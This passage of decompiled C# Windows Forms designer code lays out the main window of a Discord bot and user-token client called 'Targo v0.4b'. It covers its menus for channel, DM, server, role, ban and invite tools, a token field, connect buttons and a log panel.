			((ToolStripDropDownItem)toolsToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[5]
			{
				(ToolStripItem)channelToolsToolStripMenuItem,
				(ToolStripItem)dMToolsToolStripMenuItem,
				(ToolStripItem)botSettingsToolStripMenuItem,
				(ToolStripItem)guildSettingsToolStripMenuItem,
				(ToolStripItem)inviteToolsToolStripMenuItem
			});
			((ToolStripItem)toolsToolStripMenuItem).set_Name("toolsToolStripMenuItem");
			((ToolStripItem)toolsToolStripMenuItem).set_Size(new Size(47, 20));
			((ToolStripItem)toolsToolStripMenuItem).set_Text("Tools");
			((ToolStripItem)channelToolsToolStripMenuItem).set_Name("channelToolsToolStripMenuItem");
			((ToolStripItem)channelToolsToolStripMenuItem).set_Size(new Size(152, 22));
			((ToolStripItem)channelToolsToolStripMenuItem).set_Text("Channels");
			((ToolStripItem)channelToolsToolStripMenuItem).add_Click((EventHandler)channelToolsToolStripMenuItem_Click);
			((ToolStripItem)dMToolsToolStripMenuItem).set_Name("dMToolsToolStripMenuItem");
			((ToolStripItem)dMToolsToolStripMenuItem).set_Size(new Size(152, 22));
			((ToolStripItem)dMToolsToolStripMenuItem).set_Text("DM Tools");
			((ToolStripItem)dMToolsToolStripMenuItem).add_Click((EventHandler)dMToolsToolStripMenuItem_Click);
			((ToolStripItem)botSettingsToolStripMenuItem).set_Name("botSettingsToolStripMenuItem");
			((ToolStripItem)botSettingsToolStripMenuItem).set_Size(new Size(152, 22));
			((ToolStripItem)botSettingsToolStripMenuItem).set_Text("Bot Settings");
			((ToolStripItem)botSettingsToolStripMenuItem).add_Click((EventHandler)botSettingsToolStripMenuItem_Click);
			((ToolStripItem)guildSettingsToolStripMenuItem).set_Name("guildSettingsToolStripMenuItem");
			((ToolStripItem)guildSettingsToolStripMenuItem).set_Size(new Size(152, 22));
			((ToolStripItem)guildSettingsToolStripMenuItem).set_Text("Server Tools");
			((ToolStripItem)guildSettingsToolStripMenuItem).add_Click((EventHandler)guildSettingsToolStripMenuItem_Click);
			((ToolStripItem)inviteToolsToolStripMenuItem).set_Name("inviteToolsToolStripMenuItem");
			((ToolStripItem)inviteToolsToolStripMenuItem).set_Size(new Size(152, 22));
			((ToolStripItem)inviteToolsToolStripMenuItem).set_Text("Invite Tools");
			((ToolStripItem)inviteToolsToolStripMenuItem).add_Click((EventHandler)inviteToolsToolStripMenuItem_Click);
			((ToolStripDropDownItem)infoToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
			{
				(ToolStripItem)userInfoToolStripMenuItem,
				(ToolStripItem)roleInfoToolStripMenuItem,
				(ToolStripItem)banInfoToolStripMenuItem,
				(ToolStripItem)messagesToolStripMenuItem
			});
			((ToolStripItem)infoToolStripMenuItem).set_Name("infoToolStripMenuItem");
			((ToolStripItem)infoToolStripMenuItem).set_Size(new Size(51, 20));
			((ToolStripItem)infoToolStripMenuItem).set_Text("Server");
			((ToolStripItem)infoToolStripMenuItem).add_Click((EventHandler)infoToolStripMenuItem_Click);
			((ToolStripItem)userInfoToolStripMenuItem).set_Name("userInfoToolStripMenuItem");
			((ToolStripItem)userInfoToolStripMenuItem).set_Size(new Size(125, 22));
			((ToolStripItem)userInfoToolStripMenuItem).set_Text("Users");
			((ToolStripItem)userInfoToolStripMenuItem).add_Click((EventHandler)userInfoToolStripMenuItem_Click);
			((ToolStripItem)roleInfoToolStripMenuItem).set_Name("roleInfoToolStripMenuItem");
			((ToolStripItem)roleInfoToolStripMenuItem).set_Size(new Size(125, 22));
			((ToolStripItem)roleInfoToolStripMenuItem).set_Text("Roles");
			((ToolStripItem)roleInfoToolStripMenuItem).add_Click((EventHandler)roleInfoToolStripMenuItem_Click);
			((ToolStripItem)banInfoToolStripMenuItem).set_Name("banInfoToolStripMenuItem");
			((ToolStripItem)banInfoToolStripMenuItem).set_Size(new Size(125, 22));
			((ToolStripItem)banInfoToolStripMenuItem).set_Text("Bans");
			((ToolStripItem)banInfoToolStripMenuItem).add_Click((EventHandler)banInfoToolStripMenuItem_Click);
			((ToolStripItem)messagesToolStripMenuItem).set_Name("messagesToolStripMenuItem");
			((ToolStripItem)messagesToolStripMenuItem).set_Size(new Size(125, 22));
			((ToolStripItem)messagesToolStripMenuItem).set_Text("Messages");
			((ToolStripItem)messagesToolStripMenuItem).add_Click((EventHandler)messagesToolStripMenuItem_Click);
			((Control)label1).set_AutoSize(true);
			((Control)label1).set_Location(new Point(3, 50));
			((Control)label1).set_Name("label1");
			((Control)label1).set_Size(new Size(41, 13));
			((Control)label1).set_TabIndex(2);
			((Control)label1).set_Text("Token:");
			((Control)label4).set_AutoSize(true);
			((Control)label4).set_Location(new Point(44, 31));
			((Control)label4).set_Name("label4");
			((Control)label4).set_Size(new Size(229, 13));
			((Control)label4).set_TabIndex(15);
			((Control)label4).set_Text("Remove Symbols From Start and End of Token");
			((Control)buttonConnect1).set_Location(new Point(384, 46));
			((Control)buttonConnect1).set_Name("buttonConnect1");
			((Control)buttonConnect1).set_Size(new Size(74, 21));
			((Control)buttonConnect1).set_TabIndex(0);
			((Control)buttonConnect1).set_Text("Connect");
			((ButtonBase)buttonConnect1).set_UseVisualStyleBackColor(true);
			((Control)buttonConnect1).add_Click((EventHandler)buttonConnect1_Click);
			((Control)textBoxToken1).set_Location(new Point(47, 47));
			((Control)textBoxToken1).set_Name("textBoxToken1");
			((Control)textBoxToken1).set_Size(new Size(325, 20));
			((Control)textBoxToken1).set_TabIndex(1);
			((Control)button4).set_Location(new Point(179, 70));
			((Control)button4).set_Name("button4");
			((Control)button4).set_Size(new Size(94, 21));
			((Control)button4).set_TabIndex(13);
			((Control)button4).set_Text("Disconnect");
			((ButtonBase)button4).set_UseVisualStyleBackColor(true);
			((Control)button4).add_Click((EventHandler)button4_Click);
			((Control)checkBox1).set_AutoSize(true);
			checkBox1.set_Checked(true);
			checkBox1.set_CheckState((CheckState)1);
			((Control)checkBox1).set_Location(new Point(9, 73));
			((Control)checkBox1).set_Name("checkBox1");
			((Control)checkBox1).set_Size(new Size(76, 17));
			((Control)checkBox1).set_TabIndex(11);
			((Control)checkBox1).set_Text("Bot Token");
			((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
			checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
			((Control)checkBox2).set_AutoSize(true);
			((Control)checkBox2).set_Location(new Point(91, 73));
			((Control)checkBox2).set_Name("checkBox2");
			((Control)checkBox2).set_Size(new Size(82, 17));
			((Control)checkBox2).set_TabIndex(12);
			((Control)checkBox2).set_Text("User Token");
			((ButtonBase)checkBox2).set_UseVisualStyleBackColor(true);
			checkBox2.add_CheckedChanged((EventHandler)checkBox2_CheckedChanged);
			tableLayoutPanel3.set_ColumnCount(1);
			tableLayoutPanel1.SetColumnSpan((Control)(object)tableLayoutPanel3, 2);
			tableLayoutPanel3.get_ColumnStyles().Add((ColumnStyle)(object)new ColumnStyle((SizeType)2, 100f));
			tableLayoutPanel3.get_Controls().Add((Control)(object)richTextBox1Logger, 0, 1);
			tableLayoutPanel3.get_Controls().Add((Control)(object)label2, 0, 0);
			((Control)tableLayoutPanel3).set_Dock((DockStyle)5);
			((Control)tableLayoutPanel3).set_Location(new Point(3, 105));
			((Control)tableLayoutPanel3).set_Name("tableLayoutPanel3");
			tableLayoutPanel3.set_RowCount(2);
			tableLayoutPanel3.get_RowStyles().Add((RowStyle)(object)new RowStyle((SizeType)1, 15f));
			tableLayoutPanel3.get_RowStyles().Add((RowStyle)(object)new RowStyle((SizeType)2, 100f));
			((Control)tableLayoutPanel3).set_Size(new Size(467, 339));
			((Control)tableLayoutPanel3).set_TabIndex(23);
			((Control)richTextBox1Logger).set_Dock((DockStyle)5);
			((Control)richTextBox1Logger).set_Location(new Point(3, 18));
			((Control)richTextBox1Logger).set_Name("richTextBox1Logger");
			((TextBoxBase)richTextBox1Logger).set_ReadOnly(true);
			((Control)richTextBox1Logger).set_Size(new Size(461, 318));
			((Control)richTextBox1Logger).set_TabIndex(5);
			((Control)richTextBox1Logger).set_Text("");
			((Control)richTextBox1Logger).add_TextChanged((EventHandler)richTextBox1Logger_TextChanged);
			((Control)label2).set_AutoSize(true);
			((Control)label2).set_Location(new Point(3, 0));
			((Control)label2).set_Name("label2");
			((Control)label2).set_Size(new Size(57, 13));
			((Control)label2).set_TabIndex(4);
			((Control)label2).set_Text("Client Log:");
			tableLayoutPanel1.set_ColumnCount(1);
			tableLayoutPanel1.get_ColumnStyles().Add((ColumnStyle)(object)new ColumnStyle((SizeType)2, 50f));
			tableLayoutPanel1.get_Controls().Add((Control)(object)tableLayoutPanel3, 0, 1);
			tableLayoutPanel1.get_Controls().Add((Control)(object)panel1, 0, 0);
			tableLayoutPanel1.get_Controls().Add((Control)(object)panel2, 0, 2);
			((Control)tableLayoutPanel1).set_Dock((DockStyle)5);
			((Control)tableLayoutPanel1).set_Location(new Point(0, 0));
			((Control)tableLayoutPanel1).set_Name("tableLayoutPanel1");
			tableLayoutPanel1.set_RowCount(3);
			tableLayoutPanel1.get_RowStyles().Add((RowStyle)(object)new RowStyle((SizeType)1, 102f));
			tableLayoutPanel1.get_RowStyles().Add((RowStyle)(object)new RowStyle((SizeType)2, 100f));
			tableLayoutPanel1.get_RowStyles().Add((RowStyle)(object)new RowStyle((SizeType)1, 20f));
			((Control)tableLayoutPanel1).set_Size(new Size(473, 467));
			((Control)tableLayoutPanel1).set_TabIndex(21);
			((ToolStripItem)helpToolStripMenuItem).set_Name("helpToolStripMenuItem");
			((ToolStripItem)helpToolStripMenuItem).set_Size(new Size(44, 20));
			((ToolStripItem)helpToolStripMenuItem).set_Text("Help");
			((ToolStripItem)helpToolStripMenuItem).add_Click((EventHandler)helpToolStripMenuItem_Click_1);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(473, 467));
			((Control)this).get_Controls().Add((Control)(object)tableLayoutPanel1);
			((Control)this).get_Controls().Add((Control)(object)button5);
			((Control)this).set_ForeColor(SystemColors.get_ControlText());
			((Form)this).set_Icon((Icon)(object)(Icon)((ResourceManager)(object)val).GetObject("$this.Icon"));
			((Form)this).set_MainMenuStrip(menuStrip1);
			((Form)this).set_MaximizeBox(false);
			((Control)this).set_MinimumSize(new Size(489, 212));
			((Control)this).set_Name("Main1");
			((Control)this).set_Text("Targo v0.4b");
			((Form)this).add_Load((EventHandler)Main1_Load);
			((Control)panel2).ResumeLayout(false);
			((Control)panel2).PerformLayout();
			((Control)panel1).ResumeLayout(false);
			((Control)panel1).PerformLayout();
			((Control)menuStrip1).ResumeLayout(false);
			((Control)menuStrip1).PerformLayout();
			((Control)tableLayoutPanel3).ResumeLayout(false);
			((Control)tableLayoutPanel3).PerformLayout();
			((Control)tableLayoutPanel1).ResumeLayout(false);
			((Control)this).ResumeLayout(false);
		}
	}
}
